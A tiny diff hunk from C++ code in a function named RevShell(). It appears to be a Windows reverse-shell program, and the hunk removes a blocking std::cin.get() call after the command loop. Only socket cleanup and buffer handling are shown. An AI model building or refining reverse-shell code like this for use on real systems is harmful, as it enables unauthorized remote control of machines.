@@ -71,7 +71,6 @@ void RevShell()
 			}
 			memset(CommandReceived, 0, sizeof(CommandReceived));
 		}		
-		std::cin.get();
 	}
 	closesocket(tcpsock);
 	WSACleanup();
